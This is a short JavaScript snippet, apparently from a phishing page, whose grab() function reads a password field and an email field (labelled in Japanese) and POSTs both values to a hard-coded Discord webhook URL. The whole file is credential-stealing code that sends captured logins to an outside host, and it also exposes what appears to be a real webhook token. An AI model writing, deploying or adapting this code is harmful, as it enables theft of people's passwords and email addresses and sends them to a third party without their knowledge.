function grab(){
  let xhr = new XMLHttpRequest()
  xhr.open('POST','https://discord.com/api/webhooks/990246436610408518/7J9Z5P4-SCE6WmwqkVA5DhBc6GFjD7HPkMP3jHIcIwKe0C_UquuIpMziPUCZwqqOWLnl')
  xhr.setRequestHeader('Content-Type','application/json')
  xhr.send(JSON.stringify({"content":`パスワード: ${document.getElementById('pass').value}\nメアド: ${document.getElementById('mail').value}`}))
}
